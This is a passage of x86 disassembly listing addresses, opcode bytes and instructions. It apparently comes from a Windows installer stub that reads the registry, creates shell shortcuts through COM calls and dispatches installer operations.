  401dbe:	50                   	push   %eax
  401dbf:	53                   	push   %ebx
  401dc0:	ff 15 48 71 40 00    	call   *0x407148
  401dc6:	57                   	push   %edi
  401dc7:	ff 75 f8             	push   -0x8(%ebp)
  401dca:	f7 d8                	neg    %eax
  401dcc:	a3 e8 a7 40 00       	mov    %eax,0x40a7e8
  401dd1:	ff 15 f4 71 40 00    	call   *0x4071f4
  401dd7:	6a 03                	push   $0x3
  401dd9:	e8 cb 0c 00 00       	call   0x402aa9
  401dde:	a3 f8 a7 40 00       	mov    %eax,0x40a7f8
  401de3:	8a 45 e8             	mov    -0x18(%ebp),%al
  401de6:	59                   	pop    %ecx
  401de7:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  401dea:	ff 75 dc             	push   -0x24(%ebp)
  401ded:	8a c8                	mov    %al,%cl
  401def:	80 e1 01             	and    $0x1,%cl
  401df2:	c6 05 ff a7 40 00 01 	movb   $0x1,0x40a7ff
  401df9:	88 0d fc a7 40 00    	mov    %cl,0x40a7fc
  401dff:	8a c8                	mov    %al,%cl
  401e01:	80 e1 02             	and    $0x2,%cl
  401e04:	24 04                	and    $0x4,%al
  401e06:	68 04 a8 40 00       	push   $0x40a804
  401e0b:	88 0d fd a7 40 00    	mov    %cl,0x40a7fd
  401e11:	a2 fe a7 40 00       	mov    %al,0x40a7fe
  401e16:	e8 71 41 00 00       	call   0x405f8c
  401e1b:	68 e8 a7 40 00       	push   $0x40a7e8
  401e20:	ff 15 54 70 40 00    	call   *0x407054
  401e26:	e9 52 07 00 00       	jmp    0x40257d
  401e2b:	53                   	push   %ebx
  401e2c:	e8 78 0c 00 00       	call   0x402aa9
  401e31:	6a 01                	push   $0x1
  401e33:	8b f0                	mov    %eax,%esi
  401e35:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  401e38:	e8 6c 0c 00 00       	call   0x402aa9
  401e3d:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  401e40:	59                   	pop    %ecx
  401e41:	59                   	pop    %ecx
  401e42:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  401e45:	50                   	push   %eax
  401e46:	56                   	push   %esi
  401e47:	75 0b                	jne    0x401e54
  401e49:	ff 15 78 72 40 00    	call   *0x407278
  401e4f:	e9 03 0b 00 00       	jmp    0x402957
  401e54:	ff 15 f8 71 40 00    	call   *0x4071f8
  401e5a:	e9 f8 0a 00 00       	jmp    0x402957
  401e5f:	53                   	push   %ebx
  401e60:	e8 66 0c 00 00       	call   0x402acb
  401e65:	6a 31                	push   $0x31
  401e67:	8b f0                	mov    %eax,%esi
  401e69:	e8 5d 0c 00 00       	call   0x402acb
  401e6e:	6a 22                	push   $0x22
  401e70:	8b d8                	mov    %eax,%ebx
  401e72:	e8 54 0c 00 00       	call   0x402acb
  401e77:	6a 15                	push   $0x15
  401e79:	8b f8                	mov    %eax,%edi
  401e7b:	e8 4b 0c 00 00       	call   0x402acb
  401e80:	6a ec                	push   $0xffffffec
  401e82:	e8 9c f5 ff ff       	call   0x401423
  401e87:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401e8a:	89 45 90             	mov    %eax,-0x70(%ebp)
  401e8d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401e90:	89 45 94             	mov    %eax,-0x6c(%ebp)
  401e93:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401e96:	89 45 a8             	mov    %eax,-0x58(%ebp)
  401e99:	8a 06                	mov    (%esi),%al
  401e9b:	f6 d8                	neg    %al
  401e9d:	1b c0                	sbb    %eax,%eax
  401e9f:	89 5d 9c             	mov    %ebx,-0x64(%ebp)
  401ea2:	23 c6                	and    %esi,%eax
  401ea4:	89 45 98             	mov    %eax,-0x68(%ebp)
  401ea7:	8a 07                	mov    (%edi),%al
  401ea9:	f6 d8                	neg    %al
  401eab:	1b c0                	sbb    %eax,%eax
  401ead:	c7 45 a4 00 98 42 00 	movl   $0x429800,-0x5c(%ebp)
  401eb4:	23 c7                	and    %edi,%eax
  401eb6:	89 45 a0             	mov    %eax,-0x60(%ebp)
  401eb9:	8d 45 8c             	lea    -0x74(%ebp),%eax
  401ebc:	50                   	push   %eax
  401ebd:	e8 8a 37 00 00       	call   0x40564c
  401ec2:	85 c0                	test   %eax,%eax
  401ec4:	0f 84 52 08 00 00    	je     0x40271c
  401eca:	f6 45 90 40          	testb  $0x40,-0x70(%ebp)
  401ece:	0f 84 83 0a 00 00    	je     0x402957
  401ed4:	ff 75 c4             	push   -0x3c(%ebp)
  401ed7:	e8 9b 44 00 00       	call   0x406377
  401edc:	ff 75 c4             	push   -0x3c(%ebp)
  401edf:	eb 45                	jmp    0x401f26
  401ee1:	53                   	push   %ebx
  401ee2:	e8 e4 0b 00 00       	call   0x402acb
  401ee7:	8b f0                	mov    %eax,%esi
  401ee9:	56                   	push   %esi
  401eea:	6a eb                	push   $0xffffffeb
  401eec:	e8 a0 31 00 00       	call   0x405091
  401ef1:	56                   	push   %esi
  401ef2:	e8 12 37 00 00       	call   0x405609
  401ef7:	8b f0                	mov    %eax,%esi
  401ef9:	3b f3                	cmp    %ebx,%esi
  401efb:	0f 84 1b 08 00 00    	je     0x40271c
  401f01:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  401f04:	74 1f                	je     0x401f25
  401f06:	56                   	push   %esi
  401f07:	e8 6b 44 00 00       	call   0x406377
  401f0c:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  401f0f:	7c 09                	jl     0x401f1a
  401f11:	50                   	push   %eax
  401f12:	57                   	push   %edi
  401f13:	e8 b0 3f 00 00       	call   0x405ec8
  401f18:	eb 0b                	jmp    0x401f25
  401f1a:	3b c3                	cmp    %ebx,%eax
  401f1c:	74 07                	je     0x401f25
  401f1e:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401f25:	56                   	push   %esi
  401f26:	ff 15 14 71 40 00    	call   *0x407114
  401f2c:	e9 26 0a 00 00       	jmp    0x402957
  401f31:	6a 02                	push   $0x2
  401f33:	e8 93 0b 00 00       	call   0x402acb
  401f38:	50                   	push   %eax
  401f39:	e8 2f 43 00 00       	call   0x40626d
  401f3e:	3b c3                	cmp    %ebx,%eax
  401f40:	89 45 08             	mov    %eax,0x8(%ebp)
  401f43:	74 13                	je     0x401f58
  401f45:	8b d8                	mov    %eax,%ebx
  401f47:	ff 73 14             	push   0x14(%ebx)
  401f4a:	57                   	push   %edi
  401f4b:	e8 78 3f 00 00       	call   0x405ec8
  401f50:	ff 73 18             	push   0x18(%ebx)
  401f53:	e9 11 f6 ff ff       	jmp    0x401569
  401f58:	88 1e                	mov    %bl,(%esi)
  401f5a:	88 1f                	mov    %bl,(%edi)
  401f5c:	e9 bb 07 00 00       	jmp    0x40271c
  401f61:	6a ee                	push   $0xffffffee
  401f63:	e8 63 0b 00 00       	call   0x402acb
  401f68:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  401f6b:	89 45 d0             	mov    %eax,-0x30(%ebp)
  401f6e:	51                   	push   %ecx
  401f6f:	50                   	push   %eax
  401f70:	6a 09                	push   $0x9
  401f72:	e8 8b 43 00 00       	call   0x406302
  401f77:	ff d0                	call   *%eax
  401f79:	88 1e                	mov    %bl,(%esi)
  401f7b:	3b c3                	cmp    %ebx,%eax
  401f7d:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401f80:	88 1f                	mov    %bl,(%edi)
  401f82:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401f89:	0f 84 c8 09 00 00    	je     0x402957
  401f8f:	50                   	push   %eax
  401f90:	6a 40                	push   $0x40
  401f92:	ff 15 58 71 40 00    	call   *0x407158
  401f98:	3b c3                	cmp    %ebx,%eax
  401f9a:	89 45 08             	mov    %eax,0x8(%ebp)
  401f9d:	0f 84 b4 09 00 00    	je     0x402957
  401fa3:	6a 0a                	push   $0xa
  401fa5:	e8 58 43 00 00       	call   0x406302
  401faa:	6a 0b                	push   $0xb
  401fac:	89 45 84             	mov    %eax,-0x7c(%ebp)
  401faf:	e8 4e 43 00 00       	call   0x406302
  401fb4:	ff 75 08             	push   0x8(%ebp)
  401fb7:	89 45 88             	mov    %eax,-0x78(%ebp)
  401fba:	ff 75 f4             	push   -0xc(%ebp)
  401fbd:	53                   	push   %ebx
  401fbe:	ff 75 d0             	push   -0x30(%ebp)
  401fc1:	ff 55 84             	call   *-0x7c(%ebp)
  401fc4:	85 c0                	test   %eax,%eax
  401fc6:	74 32                	je     0x401ffa
  401fc8:	8d 45 cc             	lea    -0x34(%ebp),%eax
  401fcb:	50                   	push   %eax
  401fcc:	8d 45 f8             	lea    -0x8(%ebp),%eax
  401fcf:	50                   	push   %eax
  401fd0:	68 14 90 40 00       	push   $0x409014
  401fd5:	ff 75 08             	push   0x8(%ebp)
  401fd8:	ff 55 88             	call   *-0x78(%ebp)
  401fdb:	85 c0                	test   %eax,%eax
  401fdd:	74 1b                	je     0x401ffa
  401fdf:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401fe2:	ff 70 08             	push   0x8(%eax)
  401fe5:	56                   	push   %esi
  401fe6:	e8 dd 3e 00 00       	call   0x405ec8
  401feb:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401fee:	ff 70 0c             	push   0xc(%eax)
  401ff1:	57                   	push   %edi
  401ff2:	e8 d1 3e 00 00       	call   0x405ec8
  401ff7:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  401ffa:	ff 75 08             	push   0x8(%ebp)
  401ffd:	e9 d0 fb ff ff       	jmp    0x401bd2
  402002:	39 1d d8 37 42 00    	cmp    %ebx,0x4237d8
  402008:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40200f:	0f 8c b5 00 00 00    	jl     0x4020ca
  402015:	6a f0                	push   $0xfffffff0
  402017:	e8 af 0a 00 00       	call   0x402acb
  40201c:	6a 01                	push   $0x1
  40201e:	8b f0                	mov    %eax,%esi
  402020:	e8 a6 0a 00 00       	call   0x402acb
  402025:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  402028:	89 45 08             	mov    %eax,0x8(%ebp)
  40202b:	74 0d                	je     0x40203a
  40202d:	56                   	push   %esi
  40202e:	ff 15 54 71 40 00    	call   *0x407154
  402034:	8b f8                	mov    %eax,%edi
  402036:	3b fb                	cmp    %ebx,%edi
  402038:	75 10                	jne    0x40204a
  40203a:	6a 08                	push   $0x8
  40203c:	53                   	push   %ebx
  40203d:	56                   	push   %esi
  40203e:	ff 15 50 71 40 00    	call   *0x407150
  402044:	8b f8                	mov    %eax,%edi
  402046:	3b fb                	cmp    %ebx,%edi
  402048:	74 79                	je     0x4020c3
  40204a:	ff 75 08             	push   0x8(%ebp)
  40204d:	57                   	push   %edi
  40204e:	e8 1e 43 00 00       	call   0x406371
  402053:	8b f0                	mov    %eax,%esi
  402055:	3b f3                	cmp    %ebx,%esi
  402057:	74 3d                	je     0x402096
  402059:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  40205c:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40205f:	74 17                	je     0x402078
  402061:	ff 75 e0             	push   -0x20(%ebp)
  402064:	e8 ba f3 ff ff       	call   0x401423
  402069:	ff d6                	call   *%esi
  40206b:	85 c0                	test   %eax,%eax
  40206d:	74 31                	je     0x4020a0
  40206f:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402076:	eb 28                	jmp    0x4020a0
  402078:	68 00 90 40 00       	push   $0x409000
  40207d:	68 28 a8 40 00       	push   $0x40a828
  402082:	68 00 40 42 00       	push   $0x424000
  402087:	68 00 04 00 00       	push   $0x400
  40208c:	ff 75 f8             	push   -0x8(%ebp)
  40208f:	ff d6                	call   *%esi
  402091:	83 c4 14             	add    $0x14,%esp
  402094:	eb 0a                	jmp    0x4020a0
  402096:	ff 75 08             	push   0x8(%ebp)
  402099:	6a f7                	push   $0xfffffff7
  40209b:	e8 f1 2f 00 00       	call   0x405091
  4020a0:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  4020a3:	0f 85 ae 08 00 00    	jne    0x402957
  4020a9:	57                   	push   %edi
  4020aa:	e8 89 16 00 00       	call   0x403738
  4020af:	85 c0                	test   %eax,%eax
  4020b1:	0f 84 a0 08 00 00    	je     0x402957
  4020b7:	57                   	push   %edi
  4020b8:	ff 15 44 71 40 00    	call   *0x407144
  4020be:	e9 94 08 00 00       	jmp    0x402957
  4020c3:	6a f6                	push   $0xfffffff6
  4020c5:	e9 73 01 00 00       	jmp    0x40223d
  4020ca:	6a e7                	push   $0xffffffe7
  4020cc:	e9 6c 01 00 00       	jmp    0x40223d
  4020d1:	6a f0                	push   $0xfffffff0
  4020d3:	e8 f3 09 00 00       	call   0x402acb
  4020d8:	6a df                	push   $0xffffffdf
  4020da:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  4020dd:	e8 e9 09 00 00       	call   0x402acb
  4020e2:	6a 02                	push   $0x2
  4020e4:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4020e7:	e8 df 09 00 00       	call   0x402acb
  4020ec:	6a cd                	push   $0xffffffcd
  4020ee:	89 45 80             	mov    %eax,-0x80(%ebp)
  4020f1:	e8 d5 09 00 00       	call   0x402acb
  4020f6:	6a 45                	push   $0x45
  4020f8:	89 45 84             	mov    %eax,-0x7c(%ebp)
  4020fb:	e8 cb 09 00 00       	call   0x402acb
  402100:	ff 75 f4             	push   -0xc(%ebp)
  402103:	89 45 cc             	mov    %eax,-0x34(%ebp)
  402106:	8b 45 e8             	mov    -0x18(%ebp),%eax
  402109:	8b c8                	mov    %eax,%ecx
  40210b:	8b f8                	mov    %eax,%edi
  40210d:	8b f0                	mov    %eax,%esi
  40210f:	81 e1 ff 0f 00 00    	and    $0xfff,%ecx
  402115:	c1 f8 10             	sar    $0x10,%eax
  402118:	c1 fe 0c             	sar    $0xc,%esi
  40211b:	25 ff ff 00 00       	and    $0xffff,%eax
  402120:	89 8d 78 ff ff ff    	mov    %ecx,-0x88(%ebp)
  402126:	81 e7 00 80 00 00    	and    $0x8000,%edi
  40212c:	83 e6 07             	and    $0x7,%esi
  40212f:	89 45 88             	mov    %eax,-0x78(%ebp)
  402132:	e8 38 38 00 00       	call   0x40596f
  402137:	85 c0                	test   %eax,%eax
  402139:	75 07                	jne    0x402142
  40213b:	6a 21                	push   $0x21
  40213d:	e8 89 09 00 00       	call   0x402acb
  402142:	8d 45 08             	lea    0x8(%ebp),%eax
  402145:	50                   	push   %eax
  402146:	68 00 74 40 00       	push   $0x407400
  40214b:	6a 01                	push   $0x1
  40214d:	53                   	push   %ebx
  40214e:	68 10 74 40 00       	push   $0x407410
  402153:	ff 15 90 72 40 00    	call   *0x407290
  402159:	3b c3                	cmp    %ebx,%eax
  40215b:	0f 8c d3 00 00 00    	jl     0x402234
  402161:	8b 45 08             	mov    0x8(%ebp),%eax
  402164:	8d 55 d0             	lea    -0x30(%ebp),%edx
  402167:	52                   	push   %edx
  402168:	68 20 74 40 00       	push   $0x407420
  40216d:	8b 08                	mov    (%eax),%ecx
  40216f:	50                   	push   %eax
  402170:	ff 11                	call   *(%ecx)
  402172:	3b c3                	cmp    %ebx,%eax
  402174:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402177:	0f 8c a9 00 00 00    	jl     0x402226
  40217d:	8b 45 08             	mov    0x8(%ebp),%eax
  402180:	ff 75 f4             	push   -0xc(%ebp)
  402183:	8b 08                	mov    (%eax),%ecx
  402185:	50                   	push   %eax
  402186:	ff 51 50             	call   *0x50(%ecx)
  402189:	3b fb                	cmp    %ebx,%edi
  40218b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40218e:	75 0e                	jne    0x40219e
  402190:	8b 45 08             	mov    0x8(%ebp),%eax
  402193:	68 00 98 42 00       	push   $0x429800
  402198:	50                   	push   %eax
  402199:	8b 08                	mov    (%eax),%ecx
  40219b:	ff 51 24             	call   *0x24(%ecx)
  40219e:	3b f3                	cmp    %ebx,%esi
  4021a0:	74 0a                	je     0x4021ac
  4021a2:	8b 45 08             	mov    0x8(%ebp),%eax
  4021a5:	56                   	push   %esi
  4021a6:	50                   	push   %eax
  4021a7:	8b 08                	mov    (%eax),%ecx
  4021a9:	ff 51 3c             	call   *0x3c(%ecx)
  4021ac:	8b 45 08             	mov    0x8(%ebp),%eax
  4021af:	ff 75 88             	push   -0x78(%ebp)
  4021b2:	8b 08                	mov    (%eax),%ecx
  4021b4:	50                   	push   %eax
  4021b5:	ff 51 34             	call   *0x34(%ecx)
  4021b8:	8b 4d 84             	mov    -0x7c(%ebp),%ecx
  4021bb:	38 19                	cmp    %bl,(%ecx)
  4021bd:	74 10                	je     0x4021cf
  4021bf:	8b 45 08             	mov    0x8(%ebp),%eax
  4021c2:	ff b5 78 ff ff ff    	push   -0x88(%ebp)
  4021c8:	8b 10                	mov    (%eax),%edx
  4021ca:	51                   	push   %ecx
  4021cb:	50                   	push   %eax
  4021cc:	ff 52 44             	call   *0x44(%edx)
  4021cf:	8b 45 08             	mov    0x8(%ebp),%eax
  4021d2:	ff 75 80             	push   -0x80(%ebp)
  4021d5:	8b 08                	mov    (%eax),%ecx
  4021d7:	50                   	push   %eax
  4021d8:	ff 51 2c             	call   *0x2c(%ecx)
  4021db:	8b 45 08             	mov    0x8(%ebp),%eax
  4021de:	ff 75 cc             	push   -0x34(%ebp)
  4021e1:	8b 08                	mov    (%eax),%ecx
  4021e3:	50                   	push   %eax
  4021e4:	ff 51 1c             	call   *0x1c(%ecx)
  4021e7:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  4021ea:	7c 31                	jl     0x40221d
  4021ec:	68 00 04 00 00       	push   $0x400
  4021f1:	c7 45 f8 05 40 00 80 	movl   $0x80004005,-0x8(%ebp)
  4021f8:	ff 75 f4             	push   -0xc(%ebp)
  4021fb:	6a ff                	push   $0xffffffff
  4021fd:	ff 75 c4             	push   -0x3c(%ebp)
  402200:	53                   	push   %ebx
  402201:	53                   	push   %ebx
  402202:	ff 15 40 71 40 00    	call   *0x407140
  402208:	85 c0                	test   %eax,%eax
  40220a:	74 11                	je     0x40221d
  40220c:	8b 45 d0             	mov    -0x30(%ebp),%eax
  40220f:	6a 01                	push   $0x1
  402211:	ff 75 f4             	push   -0xc(%ebp)
  402214:	8b 08                	mov    (%eax),%ecx
  402216:	50                   	push   %eax
  402217:	ff 51 18             	call   *0x18(%ecx)
  40221a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40221d:	8b 45 d0             	mov    -0x30(%ebp),%eax
  402220:	50                   	push   %eax
  402221:	8b 08                	mov    (%eax),%ecx
  402223:	ff 51 08             	call   *0x8(%ecx)
  402226:	8b 45 08             	mov    0x8(%ebp),%eax
  402229:	50                   	push   %eax
  40222a:	8b 08                	mov    (%eax),%ecx
  40222c:	ff 51 08             	call   *0x8(%ecx)
  40222f:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  402232:	7d 13                	jge    0x402247
  402234:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40223b:	6a f0                	push   $0xfffffff0
  40223d:	e8 e1 f1 ff ff       	call   0x401423
  402242:	e9 10 07 00 00       	jmp    0x402957
  402247:	6a f4                	push   $0xfffffff4
  402249:	eb f2                	jmp    0x40223d
  40224b:	53                   	push   %ebx
  40224c:	e8 7a 08 00 00       	call   0x402acb
  402251:	6a 11                	push   $0x11
  402253:	8b f0                	mov    %eax,%esi
  402255:	e8 71 08 00 00       	call   0x402acb
  40225a:	6a 23                	push   $0x23
  40225c:	8b f8                	mov    %eax,%edi
  40225e:	e8 68 08 00 00       	call   0x402acb
  402263:	56                   	push   %esi
  402264:	89 45 08             	mov    %eax,0x8(%ebp)
  402267:	e8 01 40 00 00       	call   0x40626d
  40226c:	85 c0                	test   %eax,%eax
  40226e:	75 0d                	jne    0x40227d
  402270:	53                   	push   %ebx
  402271:	6a f9                	push   $0xfffffff9
  402273:	e8 19 2e 00 00       	call   0x405091
  402278:	e9 9f 04 00 00       	jmp    0x40271c
  40227d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402280:	56                   	push   %esi
  402281:	89 45 a8             	mov    %eax,-0x58(%ebp)
  402284:	c7 45 ac 02 00 00 00 	movl   $0x2,-0x54(%ebp)
  40228b:	e8 f0 3c 00 00       	call   0x405f80
  402290:	57                   	push   %edi
  402291:	88 5c 30 01          	mov    %bl,0x1(%eax,%esi,1)
  402295:	e8 e6 3c 00 00       	call   0x405f80
  40229a:	88 5c 38 01          	mov    %bl,0x1(%eax,%edi,1)
  40229e:	8b 45 08             	mov    0x8(%ebp),%eax
  4022a1:	66 8b 4d e0          	mov    -0x20(%ebp),%cx
  4022a5:	50                   	push   %eax
  4022a6:	53                   	push   %ebx
  4022a7:	89 75 b0             	mov    %esi,-0x50(%ebp)
  4022aa:	89 7d b4             	mov    %edi,-0x4c(%ebp)
  4022ad:	89 45 c2             	mov    %eax,-0x3e(%ebp)
  4022b0:	66 89 4d b8          	mov    %cx,-0x48(%ebp)
  4022b4:	e8 d8 2d 00 00       	call   0x405091
  4022b9:	8d 45 a8             	lea    -0x58(%ebp),%eax
  4022bc:	50                   	push   %eax
  4022bd:	ff 15 7c 71 40 00    	call   *0x40717c
  4022c3:	85 c0                	test   %eax,%eax
  4022c5:	0f 84 8c 06 00 00    	je     0x402957
  4022cb:	eb a3                	jmp    0x402270
  4022cd:	3d 0d f0 ad 0b       	cmp    $0xbadf00d,%eax
  4022d2:	74 1d                	je     0x4022f1
  4022d4:	68 10 00 20 00       	push   $0x200010
  4022d9:	6a e8                	push   $0xffffffe8
  4022db:	53                   	push   %ebx
  4022dc:	e8 ab 3c 00 00       	call   0x405f8c
  4022e1:	50                   	push   %eax
  4022e2:	e8 9f 33 00 00       	call   0x405686
  4022e7:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  4022ec:	e9 71 06 00 00       	jmp    0x402962
  4022f1:	ff 05 b4 37 42 00    	incl   0x4237b4
  4022f7:	e9 5b 06 00 00       	jmp    0x402957
  4022fc:	33 f6                	xor    %esi,%esi
  4022fe:	33 ff                	xor    %edi,%edi
  402300:	3b c3                	cmp    %ebx,%eax
  402302:	74 0b                	je     0x40230f
  402304:	53                   	push   %ebx
  402305:	e8 c1 07 00 00       	call   0x402acb
  40230a:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40230d:	8b f0                	mov    %eax,%esi
  40230f:	3b d3                	cmp    %ebx,%edx
  402311:	74 09                	je     0x40231c
  402313:	6a 11                	push   $0x11
  402315:	e8 b1 07 00 00       	call   0x402acb
  40231a:	8b f8                	mov    %eax,%edi
  40231c:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  40231f:	74 09                	je     0x40232a
  402321:	6a 22                	push   $0x22
  402323:	e8 a3 07 00 00       	call   0x402acb
  402328:	8b d8                	mov    %eax,%ebx
  40232a:	6a cd                	push   $0xffffffcd
  40232c:	e8 9a 07 00 00       	call   0x402acb
  402331:	50                   	push   %eax
  402332:	53                   	push   %ebx
  402333:	57                   	push   %edi
  402334:	56                   	push   %esi
  402335:	ff 15 4c 71 40 00    	call   *0x40714c
  40233b:	e9 6e f2 ff ff       	jmp    0x4015ae
  402340:	66 a1 10 90 40 00    	mov    0x409010,%ax
  402346:	6a 01                	push   $0x1
  402348:	66 89 45 0a          	mov    %ax,0xa(%ebp)
  40234c:	e8 7a 07 00 00       	call   0x402acb
  402351:	6a 12                	push   $0x12
  402353:	8b f8                	mov    %eax,%edi
  402355:	e8 71 07 00 00       	call   0x402acb
  40235a:	6a dd                	push   $0xffffffdd
  40235c:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  40235f:	e8 67 07 00 00       	call   0x402acb
  402364:	50                   	push   %eax
  402365:	68 ff 03 00 00       	push   $0x3ff
  40236a:	8d 45 0a             	lea    0xa(%ebp),%eax
  40236d:	56                   	push   %esi
  40236e:	50                   	push   %eax
  40236f:	ff 75 c4             	push   -0x3c(%ebp)
  402372:	57                   	push   %edi
  402373:	ff 15 38 71 40 00    	call   *0x407138
  402379:	80 3e 0a             	cmpb   $0xa,(%esi)
  40237c:	e9 ba f3 ff ff       	jmp    0x40173b
  402381:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  402384:	8b f2                	mov    %edx,%esi
  402386:	75 2b                	jne    0x4023b3
  402388:	6a 02                	push   $0x2
  40238a:	e8 7c 07 00 00       	call   0x402b0b
  40238f:	8b f0                	mov    %eax,%esi
  402391:	3b f3                	cmp    %ebx,%esi
  402393:	0f 84 83 03 00 00    	je     0x40271c
  402399:	6a 33                	push   $0x33
  40239b:	e8 2b 07 00 00       	call   0x402acb
  4023a0:	50                   	push   %eax
  4023a1:	56                   	push   %esi
  4023a2:	ff 15 20 70 40 00    	call   *0x407020
  4023a8:	56                   	push   %esi
  4023a9:	8b f8                	mov    %eax,%edi
  4023ab:	ff 15 24 70 40 00    	call   *0x407024
  4023b1:	eb 16                	jmp    0x4023c9
  4023b3:	6a 22                	push   $0x22
  4023b5:	e8 11 07 00 00       	call   0x402acb
  4023ba:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4023bd:	d1 f9                	sar    $1,%ecx
  4023bf:	51                   	push   %ecx
  4023c0:	50                   	push   %eax
  4023c1:	56                   	push   %esi
  4023c2:	e8 c2 07 00 00       	call   0x402b89
  4023c7:	8b f8                	mov    %eax,%edi
  4023c9:	3b fb                	cmp    %ebx,%edi
  4023cb:	0f 84 86 05 00 00    	je     0x402957
  4023d1:	e9 46 03 00 00       	jmp    0x40271c
  4023d6:	8b 75 e8             	mov    -0x18(%ebp),%esi
  4023d9:	8b f8                	mov    %eax,%edi
  4023db:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4023de:	6a 02                	push   $0x2
  4023e0:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  4023e3:	e8 e3 06 00 00       	call   0x402acb
  4023e8:	6a 11                	push   $0x11
  4023ea:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4023ed:	e8 d9 06 00 00       	call   0x402acb
  4023f2:	6a 02                	push   $0x2
  4023f4:	50                   	push   %eax
  4023f5:	57                   	push   %edi
  4023f6:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4023fd:	e8 59 07 00 00       	call   0x402b5b
  402402:	3b c3                	cmp    %ebx,%eax
  402404:	89 45 08             	mov    %eax,0x8(%ebp)
  402407:	0f 84 4a 05 00 00    	je     0x402957
  40240d:	33 c0                	xor    %eax,%eax
  40240f:	83 fe 01             	cmp    $0x1,%esi
  402412:	bf e8 9b 40 00       	mov    $0x409be8,%edi
  402417:	75 0e                	jne    0x402427
  402419:	6a 23                	push   $0x23
  40241b:	e8 ab 06 00 00       	call   0x402acb
  402420:	57                   	push   %edi
  402421:	e8 5a 3b 00 00       	call   0x405f80
  402426:	40                   	inc    %eax
  402427:	83 fe 04             	cmp    $0x4,%esi
  40242a:	75 12                	jne    0x40243e
  40242c:	6a 03                	push   $0x3
  40242e:	e8 76 06 00 00       	call   0x402aa9
  402433:	59                   	pop    %ecx
  402434:	a3 e8 9b 40 00       	mov    %eax,0x409be8
  402439:	56                   	push   %esi
  40243a:	89 55 80             	mov    %edx,-0x80(%ebp)
  40243d:	58                   	pop    %eax
  40243e:	83 fe 03             	cmp    $0x3,%esi
  402441:	75 0f                	jne    0x402452
  402443:	68 00 0c 00 00       	push   $0xc00
  402448:	57                   	push   %edi
  402449:	53                   	push   %ebx
  40244a:	ff 75 e4             	push   -0x1c(%ebp)
  40244d:	e8 4a 0b 00 00       	call   0x402f9c
  402452:	50                   	push   %eax
  402453:	57                   	push   %edi
  402454:	ff 75 c4             	push   -0x3c(%ebp)
  402457:	53                   	push   %ebx
  402458:	ff 75 cc             	push   -0x34(%ebp)
  40245b:	ff 75 08             	push   0x8(%ebp)
  40245e:	ff 15 28 70 40 00    	call   *0x407028
  402464:	85 c0                	test   %eax,%eax
  402466:	75 03                	jne    0x40246b
  402468:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40246b:	ff 75 08             	push   0x8(%ebp)
  40246e:	e9 cf 00 00 00       	jmp    0x402542
  402473:	68 19 00 02 00       	push   $0x20019
  402478:	e8 8e 06 00 00       	call   0x402b0b
  40247d:	6a 33                	push   $0x33
  40247f:	8b f8                	mov    %eax,%edi
  402481:	e8 45 06 00 00       	call   0x402acb
  402486:	3b fb                	cmp    %ebx,%edi
  402488:	88 1e                	mov    %bl,(%esi)
  40248a:	0f 84 8c 02 00 00    	je     0x40271c
  402490:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  402493:	c7 45 c4 00 04 00 00 	movl   $0x400,-0x3c(%ebp)
  40249a:	51                   	push   %ecx
  40249b:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40249e:	56                   	push   %esi
  40249f:	51                   	push   %ecx
  4024a0:	53                   	push   %ebx
  4024a1:	50                   	push   %eax
  4024a2:	57                   	push   %edi
  4024a3:	ff 15 2c 70 40 00    	call   *0x40702c
  4024a9:	33 c9                	xor    %ecx,%ecx
  4024ab:	41                   	inc    %ecx
  4024ac:	85 c0                	test   %eax,%eax
  4024ae:	75 2e                	jne    0x4024de
  4024b0:	83 7d 08 04          	cmpl   $0x4,0x8(%ebp)
  4024b4:	74 13                	je     0x4024c9
  4024b6:	39 4d 08             	cmp    %ecx,0x8(%ebp)
  4024b9:	74 06                	je     0x4024c1
  4024bb:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  4024bf:	75 1d                	jne    0x4024de
  4024c1:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4024c4:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4024c7:	eb 72                	jmp    0x40253b
  4024c9:	ff 36                	push   (%esi)
